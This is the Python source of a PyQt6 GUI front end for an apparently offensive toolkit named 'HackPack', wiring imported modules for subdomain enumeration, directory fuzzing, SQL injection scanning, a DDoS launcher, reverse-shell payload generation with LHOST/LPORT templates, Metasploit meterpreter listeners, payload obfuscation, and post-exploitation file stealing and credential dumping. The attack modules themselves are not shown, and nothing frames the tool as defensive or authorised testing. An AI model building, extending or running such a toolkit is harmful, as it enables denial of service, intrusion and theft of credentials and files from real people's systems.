import os
import sys
import threading
from PyQt6.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QPushButton, QLabel,
    QLineEdit, QTextEdit, QStackedLayout, QComboBox
)
from PyQt6.QtGui import QFont, QTextCursor, QShortcut, QKeySequence
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QObject

from core.subdomain_enum import subdomain_enum
from core.dir_fuzzer import fuzz_directories
from core.sql_injection import scan_sql_injection
from core.ddos import run_ddos
from core.payload_generator import generate_payload
from core.msf_listener import create_msf_listener_rc, run_msf_listener
from core.obfuscation import *

from core.obfuscation import list_obfuscation_methods

from core.PET.sys_info import sys_info
from core.PET.file_stealer import file_stealer
from core.PET.cred_dump import cred_dump

from utils import load_payload_templates
from syntax import TemplateHighlighter


class ModuleRunner(QObject):
    finished = pyqtSignal(str)
    progress = pyqtSignal(str)

    def __init__(self, module_name, target, wordlist_path=None):
        super().__init__()
        self.module_name = module_name
        self.target = target
        self.wordlist_path = wordlist_path

    def run(self):
        try:
            if self.module_name == "Subdomain Enum":
                self.progress.emit(f"[*] Getting subdomains from {self.target}...")
                result = subdomain_enum(self.target)
            elif self.module_name == "Dir Fuzz":
                self.progress.emit(f"[*] Fuzzing directories on {self.target}...")
                result = fuzz_directories(self.target, self.wordlist_path)
            elif self.module_name == "SQL Injection":
                self.progress.emit(f"[*] Scanning {self.target} for SQL injection vulnerabilities...")
                result = scan_sql_injection(self.target)
            elif self.module_name == "DDOS":
                self.progress.emit(f"[*] Launching DDOS attack on {self.target}...")
                result = run_ddos(self.target, workers=20, sockets=200)
            else:
                result = "[!] Unknown module."
        except Exception as e:
            result = f"[!] Exception: {e}"

        self.finished.emit(result)


class HackPack(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("HackPack")
        self.setGeometry(100, 100, 700, 500)

        self.stack = QStackedLayout()
        self.setLayout(self.stack)

        self.menu_screen = QWidget()
        menu_layout = QVBoxLayout()

        label = QLabel("w0rld0f5xcret5 - Choose tool")
        label.setFont(QFont("Courier", 18))
        label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        label.setStyleSheet("color: #4169e1; font-weight: bold;")
        menu_layout.addWidget(label)

        self.tools = ["Subdomain Enum", "Dir Fuzz", "SQL Injection", "DDOS", "Payload Generator", "Listener", "Obfuscate", "Post Exploitation Toolkit"]
        for tool in self.tools:
            btn = QPushButton(tool)
            btn.setStyleSheet("background-color: #333; color: #0ff; font-size: 16px;")
            btn.clicked.connect(lambda checked, t=tool: self.show_tool_screen(t))
            menu_layout.addWidget(btn)

        self.menu_screen.setLayout(menu_layout)
        self.stack.addWidget(self.menu_screen)

        self.tool_screen = QWidget()
        tool_layout = QVBoxLayout()

        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("Enter target domain or IP")
        self.target_input.setStyleSheet("background-color: #2e2e2e; color: #fff;")
        tool_layout.addWidget(self.target_input)

        self.run_btn = QPushButton("Run")
        self.run_btn.setStyleSheet("background-color: #3a3a3a; color: #0f0;")
        self.run_btn.clicked.connect(self.run_tool)
        tool_layout.addWidget(self.run_btn)

        self.cancel_btn = QPushButton("Cancel")
        self.cancel_btn.setStyleSheet("background-color: #8B0000; color: #fff; font-weight: bold;")
        self.cancel_btn.clicked.connect(self.cancel_tool)
        tool_layout.addWidget(self.cancel_btn)

        self.output = QTextEdit()
        self.output.setReadOnly(True)
        self.output.setStyleSheet("background-color: #111; color: #0f0; font-family: Courier;")
        tool_layout.addWidget(self.output)

        self.back_btn = QPushButton("⬅ Back to Menu")
        self.back_btn.setStyleSheet("background-color: #333; color: #f55;")
        self.back_btn.clicked.connect(self.show_menu)
        tool_layout.addWidget(self.back_btn)

        self.tool_screen.setLayout(tool_layout)
        self.stack.addWidget(self.tool_screen)

        self.current_tool = None
        self.worker = None
        self.thread = None

    def run_dir_fuzzer(self):
        target = self.dir_fuzz_target_input.text().strip()
        wordlist = self.dir_fuzz_wordlist_input.text().strip()

        if not target or not wordlist:
            self.dir_fuzz_output.append("[!] Please fill in all fields!")
            return

        self.thread = QThread()
        self.worker = ModuleRunner("Dir Fuzz", target, wordlist)
        self.worker.moveToThread(self.thread)

        self.thread.started.connect(self.worker.run)
        self.worker.progress.connect(self.dir_fuzz_output.append)
        self.worker.finished.connect(self.dir_fuzz_output.append)
        self.worker.finished.connect(self.thread.quit)
        self.worker.finished.connect(self.worker.deleteLater)
        self.thread.finished.connect(self.thread.deleteLater)

        self.thread.start()

    def run_subdomain_enum(self):
        target = self.subdomain_enum_target_input.text().strip()

        self.thread = QThread()
        self.worker = ModuleRunner("Subdomain Enum", target)
        self.worker.moveToThread(self.thread)

        self.thread.started.connect(self.worker.run)
        self.worker.progress.connect(self.subdomain_enum_output.append)
        self.worker.finished.connect(self.subdomain_enum_output.append)
        self.worker.finished.connect(self.thread.quit)
        self.worker.finished.connect(self.worker.deleteLater)
        self.thread.finished.connect(self.thread.deleteLater)

        self.thread.start()

    def run_obfuscation(self):
        input_file = self.obfuscation_file_input.text().strip()
        method_name = self.obfuscation_type_select.currentText().replace(".py", "")
        output_name = f"{method_name}_obfuscated_output.c"
        
        if not input_file or not method_name:
            self.obfuscation_output.append("[!] Please fill in all fields!")
            return

        output_dir = os.path.join("output", "obfuscated")
        os.makedirs(output_dir, exist_ok=True)
        output_path = os.path.join(output_dir, output_name)

        result = run_obfuscation(
            method=method_name,
            input_path=input_file,
            output_path=output_path
        )
        self.obfuscation_output.append(result)



    def show_tool_screen(self, tool_name):
        self.current_tool = tool_name

        if tool_name == "Subdomain Enum":
            self.show_subdomain_enum_screen()
            return
        if tool_name == "Dir Fuzz":
            self.show_dir_fuzz_screen()
            return
        if tool_name == "Payload Generator":
            self.show_payload_screen()
            return
        elif tool_name == "Listener":
            self.show_listener_screen()
            return
        elif tool_name == "Obfuscate":
            self.show_obfuscation_screen()
            return
        elif tool_name == "Post Exploitation Toolkit":
            self.show_pet_screen()
            return

        # SQL Injection, Dir Fuzz, Subdomain Enum, DDOS
        self.output.clear()
        self.target_input.clear()
        self.run_btn.setText(f"Run {tool_name}")
        self.stack.setCurrentWidget(self.tool_screen)

    def show_subdomain_enum_screen(self):
        self.subdomain_enum_screen = QWidget()
        layout = QVBoxLayout()

        label = QLabel("Subdomain Enumeration")
        label.setFont(QFont("Courier", 18))
        label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(label)

        self.subdomain_enum_target_input = QLineEdit()
        self.subdomain_enum_target_input.setPlaceholderText("Enter target URL: ")
        layout.addWidget(self.subdomain_enum_target_input)

        run_btn = QPushButton("Run Subdomain Enumeration")
        run_btn.setStyleSheet("background-color: #3a3a3a; color: #0f0;")
        run_btn.clicked.connect(self.run_subdomain_enum)
        layout.addWidget(run_btn)

        self.subdomain_enum_output = QTextEdit()
        self.subdomain_enum_output.setReadOnly(True)
        self.subdomain_enum_output.setStyleSheet("background-color: #111; color: #0f0; font-family: Courier;")
        layout.addWidget(self.subdomain_enum_output)

        back_btn = QPushButton("⬅ Back to Menu")
        back_btn.setStyleSheet("background-color: #333; color: #f55;")
        back_btn.clicked.connect(self.show_menu)
        layout.addWidget(back_btn)

        self.subdomain_enum_screen.setLayout(layout)
        self.stack.addWidget(self.subdomain_enum_screen)
        self.stack.setCurrentWidget(self.subdomain_enum_screen)


    def show_dir_fuzz_screen(self):
        self.dir_fuzz_screen = QWidget()
        layout = QVBoxLayout()

        label = QLabel("Directory Fuzzer")
        label.setFont(QFont("Courier", 18))
        label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(label)

        self.dir_fuzz_target_input = QLineEdit()
        self.dir_fuzz_target_input.setPlaceholderText("Enter target URL: ")
        layout.addWidget(self.dir_fuzz_target_input)

        self.dir_fuzz_wordlist_input = QLineEdit()
        self.dir_fuzz_wordlist_input.setPlaceholderText("Enter wordlist path: ")
        layout.addWidget(self.dir_fuzz_wordlist_input)

        run_btn = QPushButton("Run Directory Fuzzer")
        run_btn.setStyleSheet("background-color: #3a3a3a; color: #0f0;")
        run_btn.clicked.connect(self.run_dir_fuzzer)
        layout.addWidget(run_btn)

        self.dir_fuzz_output = QTextEdit()
        self.dir_fuzz_output.setReadOnly(True)
        self.dir_fuzz_output.setStyleSheet("background-color: #111; color: #0f0; font-family: Courier;")
        layout.addWidget(self.dir_fuzz_output)

        back_btn = QPushButton("⬅ Back to Menu")
        back_btn.setStyleSheet("background-color: #333; color: #f55;")
        back_btn.clicked.connect(self.show_menu)
        layout.addWidget(back_btn)

        self.dir_fuzz_screen.setLayout(layout)
        self.stack.addWidget(self.dir_fuzz_screen)
        self.stack.setCurrentWidget(self.dir_fuzz_screen)

    def show_payload_screen(self):
        self.payload_screen = QWidget()
        layout = QVBoxLayout()

        label = QLabel("Payload Generator")
        label.setFont(QFont("Courier", 18))
        label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(label)

        self.payload_select = QComboBox()
        self.template_paths = load_payload_templates()

        if not self.template_paths:
            self.template_paths = ["No templates found!"]
        
        self.payload_select.addItems(self.template_paths)
        layout.addWidget(self.payload_select)

        self.template_editor = QTextEdit()
        self.template_editor.setStyleSheet("ackground-color: #111; color: #0f0; font-family: Courier;")
        layout.addWidget(self.template_editor)

        self.highligther = TemplateHighlighter(self.template_editor.document())

        def load_selected_template():
            selected = self.payload_select.currentText()
            if selected and "No templates found!" not in selected:
                path = os.path.join("templates", selected)
                try:
                    with open(path, "r") as f:
                        self.template_editor.setPlainText(f.read())
                except Exception as e:
                    self.template_editor.setPlainText(f"[!] Error loading template: \n{e}")

        self.payload_select.currentTextChanged.connect(load_selected_template)

        if self.template_paths:
            self.payload_select.setCurrentIndex(0)
            load_selected_template()
    
        def save_template():
            selected = self.payload_select.currentText()
            if selected and "No templates found!" not in selected:
                path = os.path.join("templates", selected)
                try:
                    with open(path, "w") as f:
                        f.write(self.template_editor.toPlainText())
                    self.payload_output.append(f"[+] Template saved: {path}")
                except Exception as e:
                    self.payload_output.append(f"[!] Error saving template: {e}")
        save_shortcut = QShortcut(QKeySequence("Ctrl+S"), self)
        save_shortcut.activated.connect(save_template)

        def generate_from_template():
            selected = self.payload_select.currentText()
            lhost = self.lhost_input.text().strip()
            lport = self.lport_input.text().strip()
            output_name = self.output_input.text().strip()

            if not selected or not lhost or not lport or not output_name:
                self.payload_output.append("[!] Please fill in all fields!")
                return
            
            input_path = os.path.join("templates", selected)
            output_path = os.path.join("output", output_name)

            try:
                with open(input_path, "r") as f:
                    content = f.read()
                
                content = content.replace("{{IP}}", lhost).replace("{{PORT}}", lport)

                os.makedirs("output", exist_ok=True)
                with open(output_path, "w") as f:
                    f.write(content)
                self.payload_output.append(f"[+] Template written to: {output_path}")
            except Exception as e:
                self.payload_output.append(f"[!] Failed: {e}")

        self.lhost_input = QLineEdit()
        self.lhost_input.setPlaceholderText("LHOST: ")
        layout.addWidget(self.lhost_input)

        self.lport_input = QLineEdit()
        self.lport_input.setPlaceholderText("LPORT: ")
        layout.addWidget(self.lport_input)

        self.format_input = QLineEdit()
        self.format_input.setPlaceholderText("Format (exe, elf, py, etc.)")
        layout.addWidget(self.format_input)

        self.output_input = QLineEdit()
        self.output_input.setPlaceholderText("Output file name")
        layout.addWidget(self.output_input)

        run_btn = QPushButton("Generate payload")
        run_btn.setStyleSheet("background-color: #3a3a3a; color: #0f0;")
        run_btn.clicked.connect(self.run_payload_generator)
        layout.addWidget(run_btn)

        use_btn = QPushButton("Generate payload from template")
        use_btn.setStyleSheet("background-color: #3a3a3a; color: #0f0;")
        use_btn.clicked.connect(generate_from_template)
        layout.addWidget(use_btn)

        self.payload_output = QTextEdit()
        self.payload_output.setReadOnly(True)
        self.payload_output.setStyleSheet("background-color: #111; color: #0f0; font-family: Courier;")
        layout.addWidget(self.payload_output)

        back_btn = QPushButton("⬅ Back to Menu")
        back_btn.setStyleSheet("background-color: #333; color: #f55;")
        back_btn.clicked.connect(self.show_menu)
        layout.addWidget(back_btn)

        self.payload_screen.setLayout(layout)
        self.stack.addWidget(self.payload_screen)
        self.stack.setCurrentWidget(self.payload_screen)

    def show_listener_screen(self):
        self.listener_screen = QWidget()
        layout = QVBoxLayout()

        label = QLabel("Metasploit Listener")
        label.setFont(QFont("Courier", 18))
        layout.addWidget(label)

        self.listener_payload_select = QComboBox()
        self.listener_payload_select.addItems([
            "windows/meterpreter/reverse_tcp",
            "windows/meterpreter/reverse_http",
            "linux/x86/meterpreter/reverse_tcp"
        ])
        layout.addWidget(self.listener_payload_select)

        self.listener_lhost_input = QLineEdit()
        self.listener_lhost_input.setPlaceholderText("LHOST")
        layout.addWidget(self.listener_lhost_input)

        self.listener_lport_input = QLineEdit()
        self.listener_lport_input.setPlaceholderText("LPORT")
        layout.addWidget(self.listener_lport_input)

        start_btn = QPushButton("Launch Listener")
        start_btn.setStyleSheet("background-color: #3a3a3a; color: #0f0;")
        layout.addWidget(start_btn)

        self.listener_log = QTextEdit()
        self.listener_log.setReadOnly(True)
        self.listener_log.setStyleSheet("background-color: #111; color: #0f0; font-family: Courier;")
        layout.addWidget(self.listener_log)

        back_btn = QPushButton("⬅ Back to Menu")
        back_btn.setStyleSheet("background-color: #333; color: #f55;")
        back_btn.clicked.connect(self.show_menu)
        layout.addWidget(back_btn)

        self.listener_screen.setLayout(layout)
        self.stack.addWidget(self.listener_screen)
        self.stack.setCurrentWidget(self.listener_screen)

        def log_listener_output():
            lhost = self.listener_lhost_input.text().strip()
            lport = self.listener_lport_input.text().strip()
            payload = self.listener_payload_select.currentText()

            if not lhost or not lport:
                self.listener_log.append("[!] LHOST and LPORT are required!")
                return

            rc_path = create_msf_listener_rc(payload, lhost, lport)
            proc = run_msf_listener(rc_path)

            def read_output():
                for line in proc.stdout:
                    self.listener_log.append(line.strip())

            threading.Thread(target=read_output, daemon=True).start()

        start_btn.clicked.connect(log_listener_output)

    def show_obfuscation_screen(self):
        self.obfuscation_screen = QWidget()
        layout = QVBoxLayout()

        label = QLabel("Payload Obfuscation")
        label.setFont(QFont("Courier", 18))
        label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(label)

        self.obfuscation_file_input = QLineEdit()
        self.obfuscation_file_input.setPlaceholderText("Enter file to obfuscate: ")
        layout.addWidget(self.obfuscation_file_input)
        self.obfuscation_type_select = QComboBox()
        self.obfuscation_type_select.addItems(list_obfuscation_methods())
        layout.addWidget(self.obfuscation_type_select)
        obfuscate_btn = QPushButton("Obfuscate Payload")
        obfuscate_btn.setStyleSheet("background-color: #3a3a3a; color: #0f0;")
        layout.addWidget(obfuscate_btn)
        obfuscate_btn.clicked.connect(self.run_obfuscation)
        self.obfuscation_output = QTextEdit()
        self.obfuscation_output.setReadOnly(True)
        self.obfuscation_output.setStyleSheet("background-color: #111; color: #0f0; font-family: Courier;")
        layout.addWidget(self.obfuscation_output)
        back_btn = QPushButton("⬅ Back to Menu")
        back_btn.setStyleSheet("background-color: #333; color: #f55;")
        back_btn.clicked.connect(self.show_menu)
        layout.addWidget(back_btn)

        self.obfuscation_screen.setLayout(layout)
        self.stack.addWidget(self.obfuscation_screen)
        self.stack.setCurrentWidget(self.obfuscation_screen)

    def show_pet_screen(self):
        self.pet_screen = QWidget()
        layout = QVBoxLayout()

        label = QLabel("Post Exploitation Toolkit Modules")
        label.setFont(QFont("Courier", 18))
        label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(label)

        self.pet_select = QComboBox()
        self.pet_select.addItems([
            os.path.basename(f) for f in os.listdir("core/PET/") if f.endswith(".py")
        ])
        layout.addWidget(self.pet_select)

        self.pet_target_input = QLineEdit()
        self.pet_target_input.setPlaceholderText("Session IP or ID")
        layout.addWidget(self.pet_target_input)

        pet_run_btn = QPushButton("Run module")
        layout.addWidget(pet_run_btn)
        pet_run_btn.clicked.connect(self.run_pet_module)
        

        self.pet_output = QTextEdit()
        self.pet_output.setReadOnly(True)
        self.pet_output.setStyleSheet("background-color: #111; color: #0f0; font-family: Courier;")
        layout.addWidget(self.pet_output)

        back_btn = QPushButton("⬅ Back to Menu")
        back_btn.setStyleSheet("background-color: #333; color: #f55;")
        back_btn.clicked.connect(self.show_menu)
        layout.addWidget(back_btn)

        self.pet_screen.setLayout(layout)
        self.stack.addWidget(self.pet_screen)
        self.stack.setCurrentWidget(self.pet_screen)

    def run_pet_module(self):
        module_name = self.pet_select.currentText()
        target = self.pet_target_input.text().strip()

        if not target:
            self.pet_output.append("[!] Target or session is required!")
            return

        try:
            if "sys_info" in module_name.lower():
                result = sys_info(target)
            elif "file_stealer" in module_name.lower():
                result = file_stealer(target)
            elif "cred_dump" in module_name.lower():
                result = cred_dump(target)
            else:
                self.pet_output.append("[!] Unknown module!")
                return

            self.pet_output.append(str(result))

        except Exception as e:
            self.pet_output.append(f"[!] Error running module: {e}")

    def run_payload_generator(self):
        payload = self.payload_select.currentText()
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip()
        fmt = self.format_input.text().strip()
        output_file = self.output_input.text().strip()

        if not (payload and lhost and lport and fmt and output_file):
            self.payload_output.append("[!] Please fill in all fields!")
            return

        os.makedirs("output", exist_ok=True)
        output_path = os.path.join("output", output_file)

        self.payload_output.append(f"[~] Generating payload → {output_path}\n")
        result = generate_payload(payload, lhost, lport, fmt, output_path)
        self.payload_output.append(result)

        if "Payload size" in result or os.path.exists(output_path):
            self.payload_output.append(f"[+] Payload saved to: {output_path}")
        else:
            self.payload_output.append("[!] Failed to generate payload.")

    def isTOS():
        user_input = input("Do you accept the TOS? (y/n): ").lower()
        if user_input == "y":
            print("Correct")
            return True
        else:
            print("Failed, try again")
            sys.exit()

    def show_menu(self):
        self.stack.setCurrentWidget(self.menu_screen)
        
        

    def run_tool(self):
        target = self.target_input.text().strip()
        if not target:
            self.output_append("[!] Please enter a target.")
            return

        self.output_append(f"[~] Running {self.current_tool} on {target}...\n")

        self.thread = QThread()
        self.worker = ModuleRunner(self.current_tool, target)
        self.worker.moveToThread(self.thread)

        self.thread.started.connect(self.worker.run)
        self.worker.progress.connect(self.output_append)
        self.worker.finished.connect(self.output_append)
        self.worker.finished.connect(self.thread.quit)
        self.worker.finished.connect(self.worker.deleteLater)
        self.thread.finished.connect(self.thread.deleteLater)

        self.thread.start()

    def cancel_tool(self):
        if self.worker:
            try:
                if hasattr(self.worker, 'stop'):
                    self.worker.stop()
            except Exception as e:
                self.output_append(f"[!] Error stopping worker: {e}")

        if self.thread and self.thread.isRunning():
            try:
                self.thread.quit()
                self.thread.wait()
                self.output_append("[x] Tool execution cancelled.\n")
            except Exception as e:
                self.output_append(f"[!] Error stopping thread: {e}")
        else:
            self.output_append("[i] No active thread to cancel.")


    def output_append(self, text):
        self.output.moveCursor(QTextCursor.MoveOperation.End)
        self.output.insertPlainText(text + "\n")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = HackPack()
    window.show()
    sys.exit(app.exec())
